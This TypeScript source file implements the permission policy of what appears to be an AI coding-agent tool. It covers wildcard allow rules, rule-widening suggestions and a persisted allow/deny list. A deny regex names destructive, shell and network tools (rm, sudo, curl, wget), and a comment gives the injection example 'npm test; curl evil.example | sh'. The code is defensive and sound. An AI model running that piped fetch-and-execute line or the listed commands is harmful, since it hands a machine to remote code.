import { existsSync, readFileSync, writeFileSync, mkdirSync } from "node:fs";
import { dirname } from "node:path";
import type { PermissionDecision, PermissionRequest } from "../types.js";
import type { AemeathConfig, PermissionMode } from "../config/schema.js";

/**
 * Wildcard rule matching.
 *
 * Approving the exact string "run_command:npm test" is nearly useless — the next
 * command ("npm run build") asks again. So remembered rules support `*`, and a
 * user can widen one approval to a whole class ("run_command:npm *").
 * Deny rules stay literal on purpose: widening a denial silently would be worse
 * than asking again.
 */
function escapeRegExp(text: string): string {
  return text.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/** Does `value` match a rule `pattern`? `*` matches any run of characters. */
export function ruleMatches(pattern: string, value: string): boolean {
  if (!pattern.includes("*")) return pattern === value;
  const source = "^" + pattern.split("*").map(escapeRegExp).join(".*") + "$";
  return new RegExp(source).test(value);
}

/**
 * Suggest a broader rule for an approval prompt, so the UI can offer
 * "allow this class" next to "allow this once". Returns undefined when
 * widening is not meaningful (or not safe).
 */
export function suggestRule(key: string): string | undefined {
  const sep = key.indexOf(":");
  if (sep === -1) return undefined;
  const kind = key.slice(0, sep);
  const subject = key.slice(sep + 1);

  if (kind === "run_command") {
    const first = subject.trim().split(/\s+/)[0];
    /*
     * Never offer to widen these. The destructive ones need no explanation; the
     * interpreters and privilege escalators are here because "sudo *" or
     * "bash *" is not a class of command, it is every command — approving them
     * would hand over the machine under a reassuring label.
     */
    const noWiden =
      /^(rm|dd|mkfs|shutdown|reboot|poweroff|format|sudo|su|doas|runas|bash|sh|zsh|fish|csh|cmd|powershell|pwsh|python|python3|perl|ruby|node|deno|bun|env|xargs|eval|exec|nohup|curl|wget)$/i;
    if (!first || noWiden.test(first)) return undefined;
    /*
     * A shell metacharacter means the "class" is a lie: `run_command:npm *`
     * would also match `npm test; curl evil.example | sh`. Widening only makes
     * sense when the command is a plain argv.
     */
    if (/[;&|`$><\n]/.test(subject)) return undefined;
    // Don't widen a single-token command (nothing to generalise).
    if (subject.trim() === first) return undefined;
    return `${kind}:${first} *`;
  }
  if (kind === "web_fetch") {
    // A host is already the right granularity.
    return undefined;
  }
  return undefined;
}

/**
 * Permission policy with "allow once / always / deny" and a persisted
 * allow-list so approved commands are remembered across runs (fail-closed).
 */
export class PermissionPolicy {
  private remember = new Set<string>();
  private denied = new Set<string>();
  private file: string;

  constructor(private cfg: AemeathConfig, file: string) {
    this.file = file;
    this.load();
  }

  private load() {
    try {
      if (existsSync(this.file)) {
        const data = JSON.parse(readFileSync(this.file, "utf8")) as { allow?: string[]; deny?: string[] };
        this.remember = new Set(data.allow ?? []);
        this.denied = new Set(data.deny ?? []);
      }
    } catch {
      /* ignore corrupt file */
    }
  }

  private persist() {
    try {
      mkdirSync(dirname(this.file), { recursive: true });
      writeFileSync(
        this.file,
        JSON.stringify({ allow: [...this.remember], deny: [...this.denied] }, null, 2),
        "utf8",
      );
    } catch {
      /* best-effort */
    }
  }

  modeFor(kind: PermissionRequest["kind"]): PermissionMode {
    if (kind === "write_file") return this.cfg.permissions.writeFile;
    if (kind === "run_command") return this.cfg.permissions.runCommand;
    return "ask";
  }

  /** Remembered rules are patterns, so one approval can cover a class. */
  isRemembered(key: string): boolean {
    for (const rule of this.remember) if (ruleMatches(rule, key)) return true;
    return false;
  }

  /** Denials are literal — never widened. */
  isDenied(key: string): boolean {
    return this.denied.has(key);
  }

  /** All remembered rules (for the settings UI). */
  listRemembered(): string[] {
    return [...this.remember];
  }

  /** Remove one remembered rule. */
  forgetKey(key: string): void {
    if (this.remember.delete(key)) this.persist();
  }

  rememberKey(key: string) {
    this.remember.add(key);
    this.persist();
  }

  denyKey(key: string) {
    this.denied.add(key);
    this.persist();
  }

  clearRemembered() {
    this.remember.clear();
    this.persist();
  }

  /**
   * Decide without asking a human when policy already knows the answer.
   * Returns null when the caller must ask the user interactively.
   */
  preDecide(req: PermissionRequest): PermissionDecision | null {
    if (this.isDenied(req.key)) return "deny";
    if (this.isRemembered(req.key)) return "allow_always";
    const mode = this.modeFor(req.kind);
    if (mode === "allow") return "allow_once";
    if (mode === "deny") return "deny";
    return null;
  }
}
